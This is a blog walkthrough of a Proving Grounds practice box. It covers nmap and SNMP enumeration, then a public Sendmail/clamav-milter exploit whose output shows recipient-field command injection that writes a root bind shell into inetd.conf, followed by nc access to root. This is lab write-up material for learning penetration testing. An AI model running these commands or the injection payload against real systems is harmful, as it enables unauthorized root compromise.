---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -sV 192.168.59.42
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 15:56 EST
Nmap scan report for 192.168.59.42
Host is up (0.10s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds
```

## quick checks
- standard ```ssh``` service on port 22
- `smtp` service on port 25
- website without useful content (no reasonable dirb results) on port 80
- `smb` on port 139/445
- `snmp` protocol on port 199

## checking `snmp` to gather more information about the target
```bash
$ snmp-check 192.168.59.42
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.59.42:161 using SNMPv1 and community 'public'

[*] System information:
 ...
 3781                  runnable              clamd                 /usr/local/sbin/clamd
  3783                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
...
```
> `ClamAV` is installed and activated on the target
{: .prompt-info }

---

# exploitation
## looking for a `ClamAV` exploit
```bash
$ searchsploit clamav                      
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Overflow                                                                     | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference                                                                                  | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                                                                                                | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                                                                                                 | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)                                                                                   | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service                                                                                        | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)                                                                               | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)                                                                    | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                                                 | multiple/remote/4761.pl
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
> `Sendmail with clamav-milter < 0.91.2 - Remote Command Execution` seems to be worth a try (`multiple/remote/4761.pl`).
{: .prompt-info }

## execute the exploit
```bash
$ perl /usr/share/exploitdb/exploits/multiple/remote/4761.pl 192.168.59.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.59.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sat, 8 Jan 2022 20:59:57 -0500; (No UCE/UBE) logging access from: [192.168.49.59](FAIL)-[192.168.49.59]
250-localhost.localdomain Hello [192.168.49.59], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 2091xvno004050 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

If everything worked there should be an additional service on the target now.

## check if the exploit opened a service
```bash
$ nmap -Pn 192.168.59.42                                                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 16:01 EST
Nmap scan report for 192.168.59.42
Host is up (0.11s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
31337/tcp open  Elite
```
> Port `31337` is open now!
{: .prompt-info }

## connect to shell
```bash
$ nc 192.168.59.42 31337
whoami
root
```

> Bam! Root shell.
{: .prompt-info }

---

# post exploitation
```bash
$ nc 192.168.59.42 31337
whoami
root
cd /root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
3******************************5
```

Pwned! <@:-)
